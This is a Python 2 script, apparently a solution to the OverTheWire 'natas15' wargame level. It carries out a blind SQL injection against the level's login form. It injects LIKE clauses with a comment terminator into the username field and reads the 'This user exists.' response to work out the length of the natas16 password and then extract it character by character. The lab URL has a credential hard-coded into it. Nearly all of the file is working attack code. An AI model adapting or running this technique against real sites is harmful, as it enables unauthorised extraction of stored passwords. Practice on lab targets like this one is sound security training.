import string
import requests

url = "http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/"

#for i in range(0,128):
#    s = chr(i)
#    if (s == "%") or (s == "_"):
#        continue
#    username = "admin' AND pass LIKE '[od?x"+ s +"wj;&a7'-- "
#    password = "[od?x"+ s +"wj;&a7"
#    data = {'username' : username, 'password' : password}
#    r = requests.post(url, data=data, headers=headers)
#    output = r.text
    #print output
#    print r.status_code
#    print username
#    if "The password you entered is incorrect" in output:
#        print "Success"
#        break
#    elif "You entered an unknown Username":
#        print "Fail"
#    else:
#        print output


def find_length(name):
    username1 =  name+ "\" and password like \""
    username2 =  "\" -- "
    for i in range(100): #0 - 10
        # loop on the username here.
    #    for s in string.printable:
    #        if s == "%":
    #            continue
        s = '_'
        print i
        username = username1 + s * i + username2
        print username
        data = {'username' : username}
        r = requests.post(url, data=data)
        output = r.text
        #print output
        print r.status_code
        if "This user exists." in output:
            print "Success"
            print "i = "+str(i)
            return i
        else:
            username1 = username1

def find_pass(name, length):
    username1 =  name+"\" and password like BINARY \""
    username2 =  "\"-- "
    for i in range(length-1,-1,-1): #0 - 10
        # loop on the username here.
        for s in string.printable:
            if (s == "%") or (s == "_"):
                continue
            username = username1 + s + "_"* i + username2
            print username
            data = {'username' : username}
            r = requests.post(url, data=data)
            output = r.text
            #print output
            print r.status_code
            if "This user exists." in output:
                print "Success"
                username1 = username1 + s
                break
            else:
                print "Fail"

name = "natas16"
find_pass(name, find_length(name))
